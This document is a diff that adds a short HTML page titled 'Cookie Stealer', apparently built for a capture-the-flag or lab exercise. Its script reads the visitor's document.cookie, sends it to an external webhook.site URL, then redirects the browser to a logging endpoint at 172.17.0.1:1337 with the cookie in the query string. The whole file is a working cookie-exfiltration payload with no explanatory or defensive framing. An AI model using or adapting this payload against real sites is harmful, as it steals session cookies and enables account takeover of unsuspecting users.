@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+<body>
+<h1>Cookie Stealer</h1>
+<script>
+const cookies = document.cookie;
+console.log('Cookies:', cookies);
+fetch('https://webhook.site/5da72a93-84d0-4b70-bf2c-62ff7dcde704?c=' + encodeURIComponent(cookies))
+  .then(() => {
+    window.location = 'http://172.17.0.1:1337/log?cookie=' + encodeURIComponent(cookies);
+  });
+</script>
+</body>
+</html>
